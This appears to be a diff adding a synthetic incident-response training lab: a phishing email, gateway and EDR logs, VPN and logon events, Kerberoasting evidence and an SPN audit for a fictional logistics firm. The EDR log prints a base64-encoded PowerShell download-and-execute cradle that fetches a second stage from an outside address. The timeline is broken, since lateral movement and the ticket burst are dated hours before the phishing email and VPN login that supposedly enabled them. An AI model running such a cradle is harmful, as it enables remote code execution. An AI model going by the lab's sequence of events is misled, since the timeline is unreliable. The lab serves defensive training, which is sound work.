@@ -1,0 +1,186 @@
+=== Act 1 - Phishing email (initial access) ===
+Return-Path: <AP-Automation@bellwood-support.com>
+Received: from mx1.bellwood-support.com (mx1.bellwood-support.com [203.0.113.45])
+	by mailgw.bellwoodlogistics.com (Postfix) with ESMTPS id 7F3A21C2E01
+	for <sandra.kim@bellwoodlogistics.com>; Mon, 10 Aug 2026 09:08:14 +0000 (UTC)
+Authentication-Results: mailgw.bellwoodlogistics.com;
+	spf=softfail (sender IP is 203.0.113.45) smtp.mailfrom=bellwood-support.com;
+	dkim=none (no signature);
+	dmarc=none action=none header.from=bellwood-support.com
+From: "Bellwood AP Automation" <AP-Automation@bellwood-support.com>
+To: Sandra Kim <sandra.kim@bellwoodlogistics.com>
+Subject: Invoice #BW-88291 Payment Confirmation Required
+Date: Mon, 10 Aug 2026 09:08:09 +0000
+Message-ID: <8f3c1a2e-88291-bellwood@bellwood-support.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="000000000000a1e4c9d2f6b8"
+
+--000000000000a1e4c9d2f6b8
+Content-Type: text/plain; charset="UTF-8"
+
+Hi Sandra,
+
+Our records show invoice #BW-88291 is past due for payment confirmation. Please review the
+attached statement and confirm the remittance details on file before end of day to avoid a
+processing hold on this week's carrier settlements.
+
+Regards,
+AP Automation Team
+Bellwood Logistics Vendor Portal
+
+--000000000000a1e4c9d2f6b8
+Content-Type: application/vnd.ms-excel.sheet.macroEnabled.12; name="Invoice_BW88291.xlsm"
+Content-Disposition: attachment; filename="Invoice_BW88291.xlsm"
+Content-Transfer-Encoding: base64
+X-Attachment-SHA256: a1e4c9d2f6b8034e7c1a29d5f3b6e8901c4d7f2a5b8e1c4f7a0d3b6e9c2f5a81
+
+[attachment body intentionally elided for this training lab — no working macro payload is
+distributed here; the SHA-256 above is the synthetic indicator carried through
+mail-gateway.log and endpoint-alert.log for correlation]
+
+--000000000000a1e4c9d2f6b8--
+
+=== Act 1 - Mail gateway delivery/detonation log ===
+# Bellwood Logistics — mail gateway delivery/detonation log (synthetic training data)
+# Format: timestamp | direction | from | to | src_ip | verdict | detail
+2026-08-10T09:08:11Z | inbound | AP-Automation@bellwood-support.com | sandra.kim@bellwoodlogistics.com | 203.0.113.45 | SPF_SOFTFAIL | spf=softfail dkim=none dmarc=none-action(policy=p=none) — bellwoodlogistics.com DMARC record published as "v=DMARC1; p=none; rua=mailto:dmarc-reports@bellwoodlogistics.com"
+2026-08-10T09:08:12Z | inbound | AP-Automation@bellwood-support.com | sandra.kim@bellwoodlogistics.com | 203.0.113.45 | ATTACHMENT_SCAN | file=Invoice_BW88291.xlsm sha256=a1e4c9d2f6b8034e7c1a29d5f3b6e8901c4d7f2a5b8e1c4f7a0d3b6e9c2f5a81 macro_detected=true macro_verdict=SUSPICIOUS engine=legacy-av-sig no-match-known-family
+2026-08-10T09:08:13Z | inbound | AP-Automation@bellwood-support.com | sandra.kim@bellwoodlogistics.com | 203.0.113.45 | POLICY_DECISION | action=ALLOWED reason="SPF softfail and unknown macro verdict do not meet BLOCK threshold under current gateway policy (quarantine threshold requires DMARC p=quarantine/reject or a known-bad signature match; neither present)"
+2026-08-10T09:08:14Z | inbound | AP-Automation@bellwood-support.com | sandra.kim@bellwoodlogistics.com | 203.0.113.45 | DELIVERED | mailbox=sandra.kim@bellwoodlogistics.com folder=Inbox
+2026-08-10T09:19:47Z | telemetry | - | sandra.kim@bellwoodlogistics.com | - | MESSAGE_OPENED | client=Outlook/365 host=SANDRA-KIM-PC
+2026-08-10T09:19:55Z | telemetry | - | sandra.kim@bellwoodlogistics.com | - | ATTACHMENT_OPENED | file=Invoice_BW88291.xlsm host=SANDRA-KIM-PC user=bellwood\sandra.kim
+
+=== Act 1 - Endpoint + auth telemetry (execution, valid accounts, external remote service) ===
+# Bellwood Logistics — endpoint telemetry, SANDRA-KIM-PC (10.20.14.88) + downstream auth
+# events (synthetic training data). Times UTC.
+
+[EDR] 2026-08-10T09:19:55Z host=SANDRA-KIM-PC user=BELLWOOD\sandra.kim
+  event=PROCESS_CREATE parent=EXCEL.EXE (pid 4412) child=POWERSHELL.EXE (pid 5108)
+  cmdline="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADUALwBzAHQAYQBnAGUAMgAnACkA"
+  parent_hash=sha256:a1e4c9d2f6b8034e7c1a29d5f3b6e8901c4d7f2a5b8e1c4f7a0d3b6e9c2f5a81
+  severity=high mitre=T1566.001,T1204.002
+
+[EDR] 2026-08-10T09:19:58Z host=SANDRA-KIM-PC user=BELLWOOD\sandra.kim
+  event=NETWORK_CONNECTION process=POWERSHELL.EXE (pid 5108)
+  dst_ip=203.0.113.45 dst_port=443 direction=outbound proto=tcp
+  note="staging callback to the same IP block the phishing message originated from"
+
+[AUTH] 2026-08-10T09:58:20Z service=O365/VPN-SSO user=sandra.kim@bellwoodlogistics.com
+  event=SIGNIN_SUCCESS src_ip=203.0.113.77 src_asn="AS64512 EXAMPLE-HOSTING-BV" geo=Amsterdam-area
+  mfa_challenge=NONE_RECORDED baseline_note="user's last 90 days of sign-ins are 100% from Chicago
+  office egress 198.51.100.20; this is the first non-Chicago sign-in on this account"
+  mitre=T1078
+
+[AUTH] 2026-08-10T09:59:41Z service=vpn.bellwoodlogistics.com (external gateway) user=sandra.kim@bellwoodlogistics.com
+  event=VPN_SESSION_ESTABLISHED src_ip=203.0.113.77 assigned_internal_ip=10.20.14.230
+  internal_hostname_tag=REMOTE-SANDRA mfa_challenge=NONE_RECORDED
+  mitre=T1133
+
+=== Act 2 - Internal netflow baseline vs. incident window (lateral tool transfer) ===
+# Bellwood Logistics — internal netflow baseline vs. incident-window flows (synthetic).
+# Pre-summarized text (per casky-runner-phase1/evidence/README.md: no raw pcap accepted by
+# `casky harness -i` — this is the tshark/netflow-tool text-output equivalent, hand-authored
+# for this training lab). Times UTC. Baseline = prior 30 days of flows for the same host pair.
+
+## Baseline (30-day norm) — REMOTE-SANDRA (10.20.14.230) internal peers
+# REMOTE-SANDRA is a VPN-assigned address; under normal use it only ever reaches the
+# email/file-share front-end (10.20.1.5) during business hours (13:00-01:00 UTC), low volume.
+2026-07-01..2026-08-09 | 10.20.14.230 -> 10.20.1.5   | port 443 | avg 12 flows/day | avg 4MB/day | business hours only
+
+## Incident-window flows (2026-08-10) — first time this host pair has ever been seen
+2026-08-10T02:07:11Z | 10.20.14.230 -> 10.20.1.50  | port 3389/tcp (RDP)     | 1 flow  | 640KB   | NEW PEER — never seen in 30-day baseline
+2026-08-10T02:08:03Z | 10.20.14.230 -> 10.20.1.50  | port 445/tcp (SMB)     | 6 flows | 118MB   | NEW PEER, high volume, off-hours — consistent with tool staging ahead of RDP session
+2026-08-10T02:11:47Z | 10.20.14.230 -> 10.20.1.15  | port 445/tcp (SMB)     | 9 flows | 4.2MB   | NEW PEER — never seen in 30-day baseline, off-hours (02:xx UTC vs. 13:00-01:00 UTC norm)
+2026-08-10T02:22:05Z | 10.20.1.50   -> 10.20.1.5    | port 88/tcp (Kerberos) | 14 flows | 210KB  | burst from JMP-ADMIN01 to the domain controller — see ad/kerberos-events.txt
+
+# Host reference: 10.20.1.5 = domain controller (DC01), 10.20.1.15 = FILESVR01,
+# 10.20.1.50 = JMP-ADMIN01 (jump/admin host)
+
+=== Act 2 - SMB/RDP Windows Security event excerpts (lateral movement) ===
+# Bellwood Logistics — Windows Security event log excerpts, FILESVR01 + JMP-ADMIN01 (synthetic).
+# Event 4624 = successful logon. LogonType 3 = network (SMB), LogonType 10 = RemoteInteractive (RDP).
+# Times UTC.
+
+--- FILESVR01 (10.20.1.15) Security event log ---
+Log Name:      Security
+Event ID:      4624
+Time:          2026-08-10T02:11:49Z
+Account Name:  sandra.kim
+Account Domain: BELLWOOD
+Logon Type:    3
+Source Network Address: 10.20.14.230
+Share Accessed: \\FILESVR01\ADMIN$
+Detail:        Session established, ADMIN$ share accessed shortly after logon — consistent with
+               remote service installation / lateral-movement tooling, not a normal file-share
+               browse (Sandra Kim's role has no documented business need for ADMIN$ on FILESVR01)
+Mitre:         T1021.002
+
+--- JMP-ADMIN01 (10.20.1.50) Security event log ---
+Log Name:      Security
+Event ID:      4624
+Time:          2026-08-10T02:08:05Z
+Account Name:  sandra.kim
+Account Domain: BELLWOOD
+Logon Type:    10
+Source Network Address: 10.20.14.230
+Detail:        Interactive RDP logon, off-hours (02:08 UTC; Bellwood's documented business
+               hours are 13:00-01:00 UTC) — no prior RDP logon from this account to this host
+               in the preceding 30 days
+Mitre:         T1021.001
+
+Log Name:      Security
+Event ID:      4634
+Time:          2026-08-10T02:41:12Z
+Account Name:  sandra.kim
+Account Domain: BELLWOOD
+Detail:        Logoff, JMP-ADMIN01 — session duration 33 minutes, during which the Kerberos TGS
+               burst in ad/kerberos-events.txt occurs
+
+=== Act 3 - Kerberos event excerpts (Kerberoasting / AS-REP Roasting) ===
+# Bellwood Logistics — Domain Controller (DC01, 10.20.1.5) Kerberos event excerpts (synthetic).
+# Event 4769 = Kerberos service ticket (TGS) requested. Event 4768 = Kerberos authentication
+# ticket (AS-REQ) requested. Etype 0x17 = RC4-HMAC (a downgrade from the domain's default AES).
+# Times UTC. All requests below originate from JMP-ADMIN01 (10.20.1.50), the host RDP'd into
+# per network/smb-rdp-events.txt.
+
+--- TGS requests (Event 4769) — 2026-08-10, 02:22:05Z to 02:23:31Z (86-second window) ---
+Account Requesting Ticket: sandra.kim@BELLWOOD.LOCAL   Client Address: 10.20.1.50
+Service Name: svc-sql01   Ticket Encryption Type: 0x17 (RC4-HMAC)   Time: 02:22:05Z
+Service Name: svc-web01   Ticket Encryption Type: 0x17 (RC4-HMAC)   Time: 02:22:19Z
+Service Name: svc-backup  Ticket Encryption Type: 0x17 (RC4-HMAC)   Time: 02:22:33Z
+Service Name: svc-sql01   Ticket Encryption Type: 0x17 (RC4-HMAC)   Time: 02:22:41Z
+Service Name: svc-web01   Ticket Encryption Type: 0x17 (RC4-HMAC)   Time: 02:22:52Z
+Service Name: svc-backup  Ticket Encryption Type: 0x17 (RC4-HMAC)   Time: 02:23:01Z
+[... 8 additional requests omitted for length, same three service names, same client, same
+     etype 0x17, 02:23:04Z-02:23:31Z — 14 total requests in the 86-second window]
+
+Baseline note: normal TGS request volume for this domain is 1-2 requests/hour per account,
+default ticket encryption is AES256 (etype 0x12) per the domain's Kerberos policy — every
+request in this burst downgrades to RC4 (0x17), which is the classic Kerberoasting signature
+(request the ticket in the weakest crackable format).
+
+--- AS-REQ without pre-authentication (Event 4768) — search result: NOT FOUND ---
+# A targeted search for 4768 events with "Pre-Authentication Type: 0" (no pre-auth) against
+# svc-legacyapp for the full incident window (2026-08-09T00:00Z - 2026-08-11T00:00Z) returns
+# NO MATCHING EVENTS. svc-legacyapp's account flag has preauth disabled (see ad/spn-listing.txt)
+# and would be immediately AS-REP-roastable by anyone — but nothing in this log shows it was
+# actually requested. Exposed, not confirmed exploited.
+
+=== Act 3 - Service account / SPN audit export ===
+# Bellwood Logistics — service account / SPN audit export, bellwood.local (synthetic).
+# Columns: sAMAccountName | SPN registered | pwdLastSet | "Do not require Kerberos preauth" flag
+# | memberOf (privileged groups only, "-" if none)
+
+svc-sql01     | MSSQLSvc/sqlsrv01.bellwood.local:1433 | 2023-11-02 (900+ days old) | FALSE | -
+svc-web01     | HTTP/websrv01.bellwood.local          | 2023-09-14 (900+ days old) | FALSE | -
+svc-backup    | BackupExec/backupsrv.bellwood.local   | 2024-01-05 (900+ days old) | FALSE | Backup Operators
+svc-legacyapp | HTTP/legacyapp01.bellwood.local       | 2022-06-30 (1000+ days old) | TRUE  | -
+
+# svc-sql01, svc-web01, svc-backup: SPN-registered, password never rotated since creation —
+# Kerberoastable by any authenticated domain user (request a TGS, crack offline). All three
+# appear in the TGS burst in ad/kerberos-events.txt.
+#
+# svc-legacyapp: SPN-registered AND "Do not require Kerberos preauthentication" is set —
+# AS-REP-roastable without even needing a valid ticket request first. Equally exposed, but see
+# ad/kerberos-events.txt's note: no matching 4768-without-preauth event was found in the
+# incident window. This account was exposed, not confirmed as actually used by the attacker.
